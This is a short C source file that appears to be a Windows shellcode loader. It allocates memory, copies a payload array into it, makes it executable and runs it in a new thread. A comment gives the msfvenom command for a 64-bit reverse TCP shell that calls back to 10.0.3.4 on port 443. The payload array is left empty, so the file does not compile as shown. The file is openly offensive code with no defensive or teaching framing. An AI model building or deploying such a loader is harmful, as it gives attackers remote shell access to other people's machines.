#include <windows.h>
#include <stdio.h>
#include <string.h>

// shellcode payload

unsigned char shellcode_payload[] = 
//msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f c -v shellcode_payload

// main code
int main(VOID){

// shellcode length
unsigned int shellcode_length=sizeof(shellcode_payload);

// allocate the memory
LPVOID memory_address=VirtualAlloc(
    NULL,
    shellcode_length,
    MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE
);

// load the shellcode in the memory

RtlMoveMemory(
    memory_address,shellcode_payload,shellcode_length
);

// make shellcode executable
DWORD old_protection=0;
BOOL returned_vp= VirtualProtect(
    memory_address,
    shellcode_length,
    PAGE_EXECUTE_READ,
    & old_protection
);

// execute thread
if(returned_vp!= NULL){
    HANDLE thread_handle= CreateThread(
        NULL,
        NULL,
        (LPTHREAD_START_ROUTINE) memory_address,
        NULL,NULL,NULL
    );

    // wait for thread to complete
    WaitForSingleObject(
        thread_handle,
        INFINITE
    );
}
}
